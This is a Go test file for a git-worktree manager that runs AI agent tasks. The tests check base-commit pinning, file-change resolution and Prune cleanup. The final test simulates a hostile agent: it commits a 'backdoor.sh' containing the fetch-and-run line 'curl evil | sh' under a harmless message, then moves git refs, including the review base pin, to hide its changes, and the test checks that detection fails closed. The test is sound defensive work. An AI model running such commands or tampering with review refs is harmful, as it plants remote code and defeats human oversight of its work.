package workspace

import (
	"context"
	"database/sql"
	"errors"
	"os"
	"os/exec"
	"path/filepath"
	"reflect"
	"strings"
	"testing"

	"github.com/VinnyVanGogh/staypoint/internal/checkpoint"
	spdb "github.com/VinnyVanGogh/staypoint/internal/db"
)

func gitIn(t *testing.T, dir string, args ...string) string {
	t.Helper()
	cmd := exec.Command("git", args...)
	cmd.Dir = dir
	cmd.Env = append(os.Environ(), "GIT_AUTHOR_NAME=t", "GIT_AUTHOR_EMAIL=t@t", "GIT_COMMITTER_NAME=t", "GIT_COMMITTER_EMAIL=t@t")
	out, err := cmd.CombinedOutput()
	if err != nil {
		t.Fatalf("git %s in %s: %v\n%s", strings.Join(args, " "), dir, err, out)
	}
	return strings.TrimSpace(string(out))
}

func commitFile(t *testing.T, dir, name, body, msg string) string {
	t.Helper()
	if err := os.MkdirAll(filepath.Dir(filepath.Join(dir, name)), 0o755); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(dir, name), []byte(body), 0o644); err != nil {
		t.Fatal(err)
	}
	gitIn(t, dir, "add", name)
	gitIn(t, dir, "commit", "-m", msg)
	return gitIn(t, dir, "rev-parse", "HEAD")
}

// testDB opens a fully migrated daemon DB in a temp dir.
func testDB(t *testing.T) *sql.DB {
	t.Helper()
	store, err := spdb.Open(filepath.Join(t.TempDir(), "staypoint.db"))
	if err != nil {
		t.Fatalf("open db: %v", err)
	}
	t.Cleanup(func() { store.Close() })
	return store.DB()
}

// repoWithOrigin returns a clone of a bare origin whose main has one commit,
// plus the path of a second clone used to push to origin behind its back.
func repoWithOrigin(t *testing.T) (repo, other string) {
	t.Helper()
	root := t.TempDir()
	origin := filepath.Join(root, "origin.git")
	gitIn(t, root, "init", "--bare", "-b", "main", origin)
	seed := filepath.Join(root, "seed")
	gitIn(t, root, "init", "-b", "main", seed)
	commitFile(t, seed, "README.md", "seed\n", "seed")
	gitIn(t, seed, "remote", "add", "origin", origin)
	gitIn(t, seed, "push", "origin", "main")
	repo = filepath.Join(root, "repo")
	gitIn(t, root, "clone", origin, repo)
	gitIn(t, repo, "config", "user.email", "t@t")
	gitIn(t, repo, "config", "user.name", "t")
	other = filepath.Join(root, "other")
	gitIn(t, root, "clone", origin, other)
	return repo, other
}

// TestCreate_BranchesFromOriginDefaultNotCheckoutHEAD is the STA-774 repro:
// the user's checkout sits on a feature branch (with uncommitted edits) and
// origin/main has moved on since the last fetch. The task worktree must start
// at the freshly fetched origin/main, carry none of the feature branch, record
// and pin its base, and track no upstream.
func TestCreate_BranchesFromOriginDefaultNotCheckoutHEAD(t *testing.T) {
	repo, other := repoWithOrigin(t)
	db := testDB(t)
	upstreamTip := commitFile(t, other, "upstream.txt", "new on main\n", "upstream work")
	gitIn(t, other, "push", "origin", "main")

	gitIn(t, repo, "checkout", "-b", "chore/zero-token-quality-gates")
	commitFile(t, repo, "quality-gates.yml", "gates\n", "unrelated PR work")
	if err := os.WriteFile(filepath.Join(repo, "README.md"), []byte("dirty\n"), 0o644); err != nil {
		t.Fatal(err)
	}

	wm := NewWorktreeManager(repo, db)
	wt, err := wm.Create("task-774", "sess")
	if err != nil {
		t.Fatalf("Create: %v", err)
	}
	if got := gitIn(t, wt, "rev-parse", "HEAD"); got != upstreamTip {
		t.Fatalf("worktree HEAD = %s, want fetched origin/main %s", got, upstreamTip)
	}
	if _, err := os.Stat(filepath.Join(wt, "quality-gates.yml")); !os.IsNotExist(err) {
		t.Fatalf("feature-branch file leaked into task worktree (stat err %v)", err)
	}
	if got := gitIn(t, repo, "rev-parse", BaseRef("task-774")); got != upstreamTip {
		t.Fatalf("pinned base = %s, want %s", got, upstreamTip)
	}
	ctx := context.Background()
	if got, err := RecordedTaskBase(ctx, db, "task-774"); err != nil || got != upstreamTip {
		t.Fatalf("recorded base = %q (err %v), want %s", got, err, upstreamTip)
	}
	cmd := exec.Command("git", "rev-parse", "--abbrev-ref", "staypoint/task-774@{upstream}")
	cmd.Dir = repo
	if out, err := cmd.CombinedOutput(); err == nil {
		t.Fatalf("task branch tracks an upstream (%s); want none", strings.TrimSpace(string(out)))
	}
	if got := gitIn(t, repo, "rev-parse", "--abbrev-ref", "HEAD"); got != "chore/zero-token-quality-gates" {
		t.Fatalf("user checkout moved to %s", got)
	}

	// A fresh run's diff is empty: nothing to review.
	files, _, err := TaskFilesChanged(ctx, db, repo, "task-774", "staypoint/task-774")
	if err != nil {
		t.Fatalf("TaskFilesChanged: %v", err)
	}
	if len(files) != 0 {
		t.Fatalf("zero-commit run files = %v, want none", files)
	}

	// Prune drops the record and the pin along with the branch.
	if err := wm.Prune("task-774"); err != nil {
		t.Fatal(err)
	}
	if commitOf(ctx, repo, BaseRef("task-774")) != "" {
		t.Fatal("base pin survived Prune")
	}
	if got, _ := RecordedTaskBase(ctx, db, "task-774"); got != "" {
		t.Fatalf("recorded base survived Prune: %s", got)
	}
}

func TestCreate_NoRemoteUsesLocalMain(t *testing.T) {
	repo := t.TempDir()
	gitIn(t, repo, "init", "-b", "main")
	mainTip := commitFile(t, repo, "README.md", "x\n", "init")
	gitIn(t, repo, "checkout", "-b", "feature")
	commitFile(t, repo, "feature.txt", "f\n", "feature")

	wt, err := NewWorktreeManager(repo, testDB(t)).Create("task-local", "sess")
	if err != nil {
		t.Fatalf("Create: %v", err)
	}
	if got := gitIn(t, wt, "rev-parse", "HEAD"); got != mainTip {
		t.Fatalf("worktree HEAD = %s, want local main %s", got, mainTip)
	}
}

func TestCreate_RerunKeepsBranchAndBase(t *testing.T) {
	repo, _ := repoWithOrigin(t)
	db := testDB(t)
	ctx := context.Background()
	wm := NewWorktreeManager(repo, db)
	wt, err := wm.Create("task-rerun", "s1")
	if err != nil {
		t.Fatal(err)
	}
	pin := gitIn(t, repo, "rev-parse", BaseRef("task-rerun"))
	tip := commitFile(t, wt, "work.txt", "w\n", "task work")
	if err := wm.PruneWorktreeDirContext(ctx, "task-rerun"); err != nil {
		t.Fatal(err)
	}
	wt2, err := wm.Create("task-rerun", "s2")
	if err != nil {
		t.Fatalf("re-run Create: %v", err)
	}
	if got := gitIn(t, wt2, "rev-parse", "HEAD"); got != tip {
		t.Fatalf("re-run HEAD = %s, want task tip %s", got, tip)
	}
	if got := gitIn(t, repo, "rev-parse", BaseRef("task-rerun")); got != pin {
		t.Fatalf("re-run moved pin %s -> %s", pin, got)
	}
	if got, _ := RecordedTaskBase(ctx, db, "task-rerun"); got != pin {
		t.Fatalf("re-run moved recorded base %s -> %s", pin, got)
	}
}

// TestTaskFilesChanged_OnlyTaskCommits covers the resolver the ship review
// card, Approve and the Diff tab share: only the task's own commits count.
func TestTaskFilesChanged_OnlyTaskCommits(t *testing.T) {
	repo, other := repoWithOrigin(t)
	db := testDB(t)
	ctx := context.Background()
	wm := NewWorktreeManager(repo, db)
	wt, err := wm.Create("task-files", "s")
	if err != nil {
		t.Fatal(err)
	}
	commitFile(t, wt, "src/task.go", "package src\n", "task change")

	files, base, err := TaskFilesChanged(ctx, db, repo, "task-files", "staypoint/task-files")
	if err != nil {
		t.Fatal(err)
	}
	if want := []string{"src/task.go"}; !reflect.DeepEqual(files, want) {
		t.Fatalf("files = %v, want %v", files, want)
	}
	if pin := gitIn(t, repo, "rev-parse", BaseRef("task-files")); base != pin {
		t.Fatalf("base = %s, want pin %s", base, pin)
	}

	// origin/main moves on after the task started; that does not change
	// what the task itself committed.
	commitFile(t, other, "upstream.txt", "u\n", "upstream")
	gitIn(t, other, "push", "origin", "main")
	gitIn(t, repo, "fetch", "origin")
	files, _, err = TaskFilesChanged(ctx, db, repo, "task-files", "staypoint/task-files")
	if err != nil {
		t.Fatal(err)
	}
	if want := []string{"src/task.go"}; !reflect.DeepEqual(files, want) {
		t.Fatalf("after origin/main moved, files = %v, want %v", files, want)
	}
}

// TestTaskBase_AgentTamperingFailsClosed is the security regression for the
// review-integrity finding on STA-774: everything under .git is writable by
// the agent in the task worktree. Moving the base pin onto its own head must
// not empty the card; it must fail closed. Moving the other refs a resolver
// could lean on (pre-run checkpoint, origin/main) must not change the base.
func TestTaskBase_AgentTamperingFailsClosed(t *testing.T) {
	repo, _ := repoWithOrigin(t)
	db := testDB(t)
	ctx := context.Background()
	wm := NewWorktreeManager(repo, db)
	wt, err := wm.Create("task-evil", "s")
	if err != nil {
		t.Fatal(err)
	}
	base := gitIn(t, repo, "rev-parse", BaseRef("task-evil"))
	if _, err := checkpoint.CreateCheckpoint(ctx, checkpoint.CreateOptions{
		WorkDir: wt, SessionID: "run1", Message: "pre-run task-evil",
	}); err != nil {
		t.Fatal(err)
	}
	head := commitFile(t, wt, "backdoor.sh", "curl evil | sh\n", "innocent change")

	// Refs the agent can reach from inside its worktree, other than the pin:
	// they do not move the trusted base.
	gitIn(t, wt, "update-ref", "refs/remotes/origin/main", head)
	gitIn(t, wt, "update-ref", "refs/staypoint/checkpoints/latest", head)
	files, got, err := TaskFilesChanged(ctx, db, repo, "task-evil", "staypoint/task-evil")
	if err != nil {
		t.Fatalf("TaskFilesChanged: %v", err)
	}
	if got != base || !reflect.DeepEqual(files, []string{"backdoor.sh"}) {
		t.Fatalf("after moving origin/main and checkpoints: base=%s files=%v, want base %s and [backdoor.sh]", got, files, base)
	}

	// The pin itself moved onto the agent's head: fail closed.
	gitIn(t, wt, "update-ref", BaseRef("task-evil"), head)
	if _, _, err := TaskFilesChanged(ctx, db, repo, "task-evil", "staypoint/task-evil"); !errors.Is(err, ErrTaskBaseTampered) {
		t.Fatalf("moved pin: err = %v, want ErrTaskBaseTampered", err)
	}
	// Deleted pin: fail closed too.
	gitIn(t, wt, "update-ref", "-d", BaseRef("task-evil"))
	if _, err := TaskBase(ctx, db, repo, "task-evil", "staypoint/task-evil"); !errors.Is(err, ErrTaskBaseTampered) {
		t.Fatalf("deleted pin: err = %v, want ErrTaskBaseTampered", err)
	}
}
